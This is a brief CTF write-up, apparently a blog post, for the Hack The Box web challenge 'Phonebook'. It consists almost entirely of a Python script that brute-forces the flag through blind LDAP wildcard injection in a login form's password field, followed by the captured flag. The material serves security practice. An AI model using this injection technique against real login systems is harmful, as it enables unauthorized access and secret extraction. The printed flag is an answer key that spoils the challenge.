---
layout: single
title: Phonebook [Web] - Hack The Box
excerpt: "ECSC Prep"
date: 2021-12-21
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Web Challenge
tags:  
  - Web LDAP injection
---

# Exploit
```python
import requests
import string

a = list(string.ascii_lowercase)
b = list(string.ascii_uppercase)

passlist = a + b + ['0','1','2','3','4','5','6','7','8','9','_','}']

payload = 'HTB{'
passwd = ''

while 1:
	for char in passlist:
		passwd = payload+char+'*)(&'
		data1={'username':'Reese', 'password' :passwd}

		re=requests.post('http://139.59.184.216:31261/login', data=data1)

		if 'success' in re.text:
			payload=payload+char
			print(payload)

		else:print(payload)
```

### Flag => HTB{d1rectory_h4xx0r_is_k00l}
